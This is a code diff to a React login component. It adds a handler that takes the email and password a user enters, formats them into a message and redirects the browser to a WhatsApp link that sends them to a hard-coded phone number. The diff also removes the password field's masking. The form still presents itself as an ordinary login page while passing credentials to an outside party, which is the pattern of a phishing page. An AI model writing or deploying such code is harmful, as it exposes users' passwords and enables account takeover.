@@ -1,7 +1,54 @@
-import React from "react";
+import React, {useRef } from "react";
 import { FaUser, FaLock } from "react-icons/fa";
 import img from '.././../assets/threeD.svg';
-const Login = () => {
+function Login(){
+
+  const mailRef = useRef();
+  const passwordRef = useRef();
+
+
+  const handleclick = (e) => {
+    e.preventDefault();
+
+    
+
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    if (!emailRegex.test(mailRef.current.value)) {
+      alert("Please Enter Valid Email");
+      return;
+    }
+
+    if (!passwordRef.current.value) {
+      alert("Enter User Password");
+      return;
+    }
+
+    // const name = nameRef.current.value;
+    const email = mailRef.current.value;
+    const password = passwordRef.current.value;
+
+    // WhatsApp Message Format
+    const text = `New Message From Portfolio:
+
+
+Email: ${email}
+Password: ${password}`;
+
+    // 👇 Yaha apna number daalo
+const whatsappURL =
+  `https://api.whatsapp.com/send?phone=919351290213&text=${encodeURIComponent(text)}`;
+
+   window.location.href = whatsappURL;
+
+    alert(`Thank You `);
+
+    // nameRef.current.value = "";
+    mailRef.current.value = "";
+    passwordRef.current.value = "";
+  }
+
+ 
 
   return (
     <div className=" min-h-screen flex items-center justify-center bg-gradient-to-r from-purple-600 via-indigo-600 to-blue-600 p-6 ">
@@ -21,6 +68,8 @@ const Login = () => {
             <input
               type="email"
               placeholder="Enter your email"
+             ref={mailRef}
+              
               className="bg-transparent outline-none w-full text-white placeholder-gray-200"
             />
           </div>
@@ -29,15 +78,15 @@ const Login = () => {
           <div className="flex items-center bg-white/20 rounded-full px-4 py-3 mb-5">
             <FaLock className="mr-3 text-gray-200" />
             <input
-              type="password"
+            ref={passwordRef}
+             
               placeholder="Enter your password"
-              className="bg-transparent outline-none w-full text-white placeholder-gray-200"
+                           className="bg-transparent outline-none w-full text-white placeholder-gray-200"
             />
           </div>
 
-          <button onClick={()=>{
-            alert("WelCome To User")
-          }} className="w-full bg-gradient-to-r from-purple-500 to-indigo-500 py-3 rounded-full text-lg font-semibold hover:scale-105 transition">
+          <button onClick={handleclick}
+             className="w-full bg-gradient-to-r from-purple-500 to-indigo-500 py-3 rounded-full text-lg font-semibold hover:scale-105 transition">
             Login
           </button>
 
